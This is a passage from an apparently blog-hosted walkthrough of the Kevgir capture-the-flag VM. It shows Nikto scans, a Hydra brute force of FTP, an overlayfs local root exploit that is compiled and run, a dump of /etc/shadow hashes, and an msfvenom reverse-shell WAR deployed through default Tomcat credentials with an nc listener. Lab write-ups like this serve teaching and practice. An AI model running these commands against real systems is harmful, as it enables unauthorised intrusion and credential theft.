</span><span class='line'>&lt;li&gt;8479 requests: <span class="m">0</span> error<span class="o">(</span>s<span class="o">)</span> and <span class="m">10</span> item<span class="o">(</span>s<span class="o">)</span> reported on remote host
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;End Time:           2016-05-23 06:29:07 <span class="o">(</span>GMT-4<span class="o">)</span> <span class="o">(</span><span class="m">19</span> seconds<span class="o">)</span>&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;1 host<span class="o">(</span>s<span class="o">)</span> tested
</span></code></pre></td></tr></table></div></figure></li>
</ul>


<p>phpmyadmin was found but nothing else, so I move on to port 8080.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;- Nikto v2.1.6&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Target IP:          10.1.1.128&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Target Hostname:    10.1.1.128&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Target Port:        8080
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Start Time:         2016-05-23 06:30:28 <span class="o">(</span>GMT-4<span class="o">)</span>&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Server: Apache-Coyote/1.1&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Server leaks inodes via ETags, header found with file /, fields: 0xW/1895 0x1454530701000&lt;/li&gt;
</span><span class='line'>&lt;li&gt;The anti-clickjacking X-Frame-Options header is not present.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS&lt;/li&gt;
</span><span class='line'>&lt;li&gt;The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;No CGI Directories found <span class="o">(</span>use <span class="p">&amp;</span>lsquo<span class="p">;</span>-C all<span class="p">&amp;</span>rsquo<span class="p">;</span> to force check all possible <span class="nb">dirs</span><span class="o">)</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS&lt;/li&gt;
</span><span class='line'>&lt;li&gt;OSVDB-397: HTTP method <span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>Allow<span class="p">&amp;</span>rsquo<span class="p">;</span> Header<span class="o">)</span>: <span class="p">&amp;</span>lsquo<span class="p">;</span>PUT<span class="p">&amp;</span>rsquo<span class="p">;</span> method could allow clients to save files on the web server.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;OSVDB-5646: HTTP method <span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>Allow<span class="p">&amp;</span>rsquo<span class="p">;</span> Header<span class="o">)</span>: <span class="p">&amp;</span>lsquo<span class="p">;</span>DELETE<span class="p">&amp;</span>rsquo<span class="p">;</span> may allow clients to remove files on the web server.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;/: Appears to be a default Apache Tomcat install.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;/examples/servlets/index.html: Apache Tomcat default JSP pages present.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Default account found <span class="k">for</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>Tomcat Manager Application<span class="p">&amp;</span>rsquo<span class="p">;</span> at /manager/html <span class="o">(</span>ID <span class="p">&amp;</span>lsquo<span class="p">;</span>tomcat<span class="p">&amp;</span>rsquo<span class="p">;</span>, PW <span class="p">&amp;</span>lsquo<span class="p">;</span>tomcat<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span>. Apache Tomcat.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;/manager/html: Tomcat Manager / Host Manager interface found <span class="o">(</span>pass protected<span class="o">)</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;/host-manager/html: Tomcat Manager / Host Manager interface found <span class="o">(</span>pass protected<span class="o">)</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;/manager/status: Tomcat Server Status interface found <span class="o">(</span>pass protected<span class="o">)</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;7643 requests: <span class="m">0</span> error<span class="o">(</span>s<span class="o">)</span> and <span class="m">14</span> item<span class="o">(</span>s<span class="o">)</span> reported on remote host
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;End Time:           2016-05-23 06:30:50 <span class="o">(</span>GMT-4<span class="o">)</span> <span class="o">(</span><span class="m">22</span> seconds<span class="o">)</span>&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;1 host<span class="o">(</span>s<span class="o">)</span> tested
</span></code></pre></td></tr></table></div></figure></li>
</ul>


<p>Based on the result, default tomcat login/password was found: <font color="red"><code>tomcat/tomcat</code></font></p>

<h3>Vector 1: FTP login bruteforce attack</h3>

<p>Use <code>hydra</code> with <a href="https://github.com/danielmiessler/SecLists" title="SecLists">SecLists</a> dictionary to brute force week password:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Kevgir# hydra -L ~/tools/SecLists/Usernames/top_shortlist.txt -P ~/tools/SecLists/Passwords/john.txt -u -s <span class="m">25</span> 10.1.1.128 ftp
</span><span class='line'>Hydra v8.1 <span class="p">&amp;</span>copy<span class="p">;</span> <span class="m">2014</span> by van Hauser/THC - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Hydra <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.thc.org/thc-hydra&quot;</span>&gt;http://www.thc.org/thc-hydra&lt;/a&gt;<span class="o">)</span> starting at 2016-05-23 06:52:29
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">16</span> tasks per <span class="m">1</span> server, overall <span class="m">64</span> tasks, <span class="m">34177</span> login tries <span class="o">(</span>l:11/p:3107<span class="o">)</span>, ~33 tries per task
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service ftp on port 25
</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> 320.00 tries/min, <span class="m">320</span> tries in 00:01h, <span class="m">33857</span> todo in 01:46h, <span class="m">16</span> active
</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> 320.33 tries/min, <span class="m">961</span> tries in 00:03h, <span class="m">33216</span> todo in 01:44h, <span class="m">16</span> active
</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> 314.14 tries/min, <span class="m">2199</span> tries in 00:07h, <span class="m">31978</span> todo in 01:42h, <span class="m">16</span> active
</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> 311.20 tries/min, <span class="m">4668</span> tries in 00:15h, <span class="m">29509</span> todo in 01:35h, <span class="m">16</span> active
</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> 310.39 tries/min, <span class="m">9622</span> tries in 00:31h, <span class="m">24555</span> todo in 01:20h, <span class="m">16</span> active
</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> 311.81 tries/min, <span class="m">14655</span> tries in 00:47h, <span class="m">19522</span> todo in 01:03h, <span class="m">16</span> active
</span><span class='line'><span class="o">[</span>25<span class="o">][</span>ftp<span class="o">]</span> host: 10.1.1.128   login: admin   password: admin
</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> 313.14 tries/min, <span class="m">19728</span> tries in 01:03h, <span class="m">14449</span> todo in 00:47h, <span class="m">16</span> active
</span><span class='line'>^CThe session file ./hydra.restore was written. Type <span class="p">&amp;</span>ldquo<span class="p">;</span>hydra -R<span class="p">&amp;</span>rdquo<span class="p">;</span> to resume session.
</span><span class='line'>root@kali:~/Kevgir#
</span></code></pre></td></tr></table></div></figure></p>

<p>login/password found: <font color="red"><code>admin/admin</code></font></p>

<p>Then using the found username/password login via SSH (port 1322), and &hellip; succeed!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Kevgir# ssh -p <span class="m">1322</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#111;&amp;#58;&amp;#97;&amp;#x64;&amp;#x6d;&amp;#x69;&amp;#x6e;&amp;#64;&amp;#x31;&amp;#x30;&amp;#x2e;&amp;#x31;&amp;#46;&amp;#49;&amp;#46;&amp;#49;&amp;#50;&amp;#56;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x61;&amp;#x64;&amp;#109;&amp;#x69;&amp;#110;&amp;#64;&amp;#x31;&amp;#x30;&amp;#46;&amp;#49;&amp;#x2e;&amp;#x31;&amp;#46;&amp;#x31;&amp;#50;&amp;#56;&lt;/a&gt;</span>
</span><span class='line'>The authenticity of host <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="o">[</span>10.1.1.128<span class="o">]</span>:1322 <span class="o">([</span>10.1.1.128<span class="o">]</span>:1322<span class="o">)</span><span class="p">&amp;</span>rsquo<span class="p">;</span> can<span class="p">&amp;</span>rsquo<span class="p">;</span>t be established.
</span><span class='line'>ECDSA key fingerprint is 3b:03:cd:29:7b:5e:9f:3b:62:79:ed:dc:82:c7:48:8a.
</span><span class='line'>Are you sure you want to <span class="k">continue</span> connecting <span class="o">(</span>yes/no<span class="o">)</span>? yes
</span><span class='line'>Warning: Permanently added <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="o">[</span>10.1.1.128<span class="o">]</span>:1322<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="o">(</span>ECDSA<span class="o">)</span> to the list of known hosts.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;  G:                ,<span class="p">;</span>                                          &lt;br/&gt;
</span><span class='line'>  E#,    :        f#i                        .Gt  t    j.       &lt;br/&gt;
</span><span class='line'>  E#t  .GE      .E#t                        j#W:  Ej   EW,      &lt;br/&gt;
</span><span class='line'>  E#t j#K<span class="p">;</span>     i#W,     t      .DD.       <span class="p">;</span>K#f    E#,  E##j     &lt;br/&gt;
</span><span class='line'>  E#GK#f      L#D.      EK:   ,WK.      .G#D.     E#t  E###D.   &lt;br/&gt;
</span><span class='line'>  E##D.     :K#Wfff<span class="p">;</span>    E#t  i#D       j#K<span class="p">;</span>       E#t  E#jG#W<span class="p">;</span>  &lt;br/&gt;
</span><span class='line'>  E##Wi     i##WLLLLt   E#t j#f      ,K#f   ,GD<span class="p">;</span>  E#t  E#t t##f &lt;br/&gt;
</span><span class='line'>  E#jL#D:    .E#L       E#tL#i        j#Wi   E#t  E#t  E#t  :K#E:
</span><span class='line'>  E#t ,K#j     f#E:     E#WW,          .G#D: E#t  E#t  E#KDDDD###i
</span><span class='line'>  E#t   jD      ,WW<span class="p">;</span>    E#K:             ,K#fK#t  E#t  E#f,t#Wi,,,
</span><span class='line'>  j#t            .D#<span class="p">;</span>   ED.                j###t  E#t  E#t  <span class="p">;</span><span class="c">#W:&lt;br/&gt;</span>
</span><span class='line'>   ,<span class="p">;</span>              tt   t                   .G#t  E#t  DWi   ,KK:
</span><span class='line'>                                              <span class="p">;;</span>  ,<span class="p">;</span>.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;                                               by canyoupwn.me
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#108;&amp;#x74;&amp;#111;&amp;#58;&amp;#x61;&amp;#x64;&amp;#109;&amp;#x69;&amp;#x6e;&amp;#x40;&amp;#x31;&amp;#x30;&amp;#46;&amp;#x31;&amp;#x2e;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#50;&amp;#x38;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#97;&amp;#100;&amp;#109;&amp;#105;&amp;#110;&amp;#x40;&amp;#49;&amp;#48;&amp;#46;&amp;#x31;&amp;#x2e;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#x32;&amp;#56;&lt;/a&gt;&amp;rsquo;s password:</span>
</span><span class='line'>Welcome to Ubuntu 14.04.3 LTS <span class="o">(</span>GNU/Linux 3.19.0-25-generic i686<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Documentation:  &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://help.ubuntu.com/&quot;</span>&gt;https://help.ubuntu.com/&lt;/a&gt;&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;  System information as of Mon May <span class="m">23</span> 22:56:12 EEST 2016&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;  System load: 0.32              Memory usage: 4%   Processes:       167
</span><span class='line'>  Usage of /:  32.5% of 6.50GB   Swap usage:   0%   Users logged in: 0&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;  Graph this data and manage this system at:
</span><span class='line'>    &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://landscape.canonical.com/&quot;</span>&gt;https://landscape.canonical.com/&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;151 packages can be updated.
</span><span class='line'><span class="m">79</span> updates are security updates.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;The programs included with the Ubuntu system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for</span> each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span><span class='line'>applicable law.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;admin@canyoupwnme:~<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>admin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>admin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>admin<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Then, spending time on enumeration and found the target system is <code>Ubuntu 14.04</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>admin@canyoupwnme:/home/user<span class="nv">$ </span>uname -a
</span><span class='line'>Linux canyoupwnme 3.19.0-25-generic <span class="c">#26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Try to local priv escape and searching keyword <code>14.04</code> in exploit-db</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/usr/share/exploitdb# ./searchsploit 14.04&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt; Exploit Title                                                                                                                             <span class="p">|</span>  Path
</span><span class='line'>                                                                                                                                           <span class="p">|</span> <span class="o">(</span>/usr/share/exploitdb/platforms<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Apport 2.14.1 <span class="o">(</span>Ubuntu 14.04.2<span class="o">)</span> - Linux Local Root Exploit                                                                                  <span class="p">|</span> ./linux/local/36782.sh
</span><span class='line'>Seagate Central 2014.0410.0026-F Remote Root Exploit                                                                                       <span class="p">|</span> ./hardware/remote/37184.py
</span><span class='line'>Seagate Central 2014.0410.0026-F Remote Facebook Access Token Exploit                                                                      <span class="p">|</span> ./hardware/webapps/37185.py
</span><span class='line'>Linux Kernel 3.13.0 <span class="p">&amp;</span>lt<span class="p">;</span> 3.19 <span class="o">(</span>Ubuntu 12.04/14.04/14.10/15.04<span class="o">)</span> - overlayfs Local Root Shell                                                   <span class="p">|</span> ./linux/local/37292.c
</span><span class='line'>Linux Kernel 3.13.0 <span class="p">&amp;</span>lt<span class="p">;</span> 3.19 <span class="o">(</span>Ubuntu 12.04/14.04/14.10/15.04<span class="o">)</span> - overlayfs Privilege Escalation <span class="o">(</span>Access /etc/shadow<span class="o">)</span>                          <span class="p">|</span> ./linux/local/37293.txt
</span><span class='line'>NetKit FTP Client <span class="o">(</span>Ubuntu 14.04<span class="o">)</span> - Crash/DoS PoC                                                                                           <span class="p">|</span> ./linux/dos/37777.txt
</span><span class='line'>Linux Kernel <span class="p">&amp;</span>lt<span class="p">;</span><span class="o">=</span> 4.3.3 <span class="o">(</span>Ubuntu 14.04/15.10<span class="o">)</span> - overlayfs Local Root Exploit                                                                  <span class="p">|</span> ./linux/local/39166.c
</span><span class='line'>Linux Kernel <span class="o">(</span>Ubuntu 14.04.3<span class="o">)</span> - perf_event_open<span class="o">()</span> Can Race with execve<span class="o">()</span> <span class="o">(</span>/etc/shadow<span class="o">)</span>                                                     <span class="p">|</span> ./linux/dos/39771.txt&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>After several attempts and found the exploit <code>overlayfs local root exploit (39166.c)</code> is able to work.</p>

<p>So the next step is to upload the exploit file <code>39166.c</code> and <code>gcc</code> compile it to executable file, and run it for rooting!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>admin@canyoupwnme:/tmp<span class="nv">$ </span>gcc 39166.c -o 39166
</span><span class='line'>admin@canyoupwnme:/tmp<span class="nv">$ </span>./39166
</span><span class='line'>root@canyoupwnme:/tmp# id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>admin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>admin<span class="o">)</span>
</span><span class='line'>root@canyoupwnme:/tmp# <span class="nb">pwd</span>
</span><span class='line'>/tmp
</span><span class='line'>root@canyoupwnme:/tmp# cat /etc/shadow
</span><span class='line'>root:<span class="nv">$6$6ZcgUVCV$Ocsce9FUHYswcbI3UtrPNqFnkvcPOnEtstWlVSTqGYEYAYZ9aYw7tnW35uRGxb1z7ZZBZ</span>.hoQcm/S/cg0f4uI0:16843:0:99999:7:::
</span><span class='line'>daemon:&lt;em&gt;:16652:0:99999:7:::
</span><span class='line'>bin:&lt;/em&gt;:16652:0:99999:7:::
</span><span class='line'>sys:&lt;em&gt;:16652:0:99999:7:::
</span><span class='line'>sync:&lt;/em&gt;:16652:0:99999:7:::
</span><span class='line'>games:&lt;em&gt;:16652:0:99999:7:::
</span><span class='line'>man:&lt;/em&gt;:16652:0:99999:7:::
</span><span class='line'>lp:&lt;em&gt;:16652:0:99999:7:::
</span><span class='line'>mail:&lt;/em&gt;:16652:0:99999:7:::
</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;news:*:16652:0:99999:7:::&quot;</span>&gt;news:*:16652:0:99999:7:::&lt;/a&gt;
</span><span class='line'>uucp:&lt;em&gt;:16652:0:99999:7:::
</span><span class='line'>proxy:&lt;/em&gt;:16652:0:99999:7:::
</span><span class='line'>www-data:&lt;em&gt;:16652:0:99999:7:::
</span><span class='line'>backup:&lt;/em&gt;:16652:0:99999:7:::
</span><span class='line'>list:&lt;em&gt;:16652:0:99999:7:::
</span><span class='line'>irc:&lt;/em&gt;:16652:0:99999:7:::
</span><span class='line'>gnats:&lt;em&gt;:16652:0:99999:7:::
</span><span class='line'>nobody:&lt;/em&gt;:16652:0:99999:7:::
</span><span class='line'>libuuid:!:16652:0:99999:7:::
</span><span class='line'>syslog:&lt;em&gt;:16652:0:99999:7:::
</span><span class='line'>mysql:!:16834:0:99999:7:::
</span><span class='line'>messagebus:&lt;/em&gt;:16834:0:99999:7:::
</span><span class='line'>landscape:&lt;em&gt;:16834:0:99999:7:::
</span><span class='line'>sshd:&lt;/em&gt;:16834:0:99999:7:::
</span><span class='line'>tomcat7:&lt;em&gt;:16834:0:99999:7:::
</span><span class='line'>user:<span class="nv">$6$a9pCcsxn$5xvkibMZh9RDRVuAeC6vJSR2x17t52pYtdd50</span>/rh3TY.ZoE53GE.OcbtVdBMRKROLko.qbIqj88k5mOXjtE3q.:16834:0:99999:7:::
</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;ftp:*:16834:0:99999:7:::&quot;</span>&gt;ftp:*:16834:0:99999:7:::&lt;/a&gt;
</span><span class='line'>admin:<span class="nv">$6$mf3G6MUz$/</span>si.Yp0SgJH/D4WQRC2lyRAaFKUqeHzC3ZbL7ENrCR2lCNibr0d8V0y03JFEnymP8MZzBi3m6mvaeeUmyySve/:16834:0:99999:7:::
</span><span class='line'>statd:&lt;/em&gt;:16839:0:99999:7:::
</span><span class='line'>jenkins:*:16840:0:99999:7:::
</span><span class='line'>root@canyoupwnme:/tmp#
</span></code></pre></td></tr></table></div></figure></p>

<p>Well done!</p>

<h3>Vector 2: Tomcat default account login and file upload vulnerability</h3>

<p>From the nikto result of port 8080, I found this is a tomcat server which the default username/password is still available: <font color="red"><code>tomcat/tomcat</code></font>.</p>

<p>Then, accessing to management page <code>http://10.1.1.128:8080/manager/html/</code> and login with default username/password</p>

<p>After login succeed, use <code>msfvenom</code> to create a reverse_shell WAR exploit.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# msfvenom -p java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.1.1.130 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f war &gt; sh4444.war
</span><span class='line'>Payload size: <span class="m">1088</span> bytes
</span></code></pre></td></tr></table></div></figure></p>

<p>and then upload/deploy exploit WAR file.</p>

<p><img class="left" src="/downloads/Kevgir/1.png"></p>

<p>Then setup <code>nc</code> to listen on local port <code>4444</code>, and access exploit URL <code>http://10.1.1.128:8080/sh4444/</code> to run the exploit.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvnp 4444
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> <span class="p">&amp;</span>hellip<span class="p">;</span>
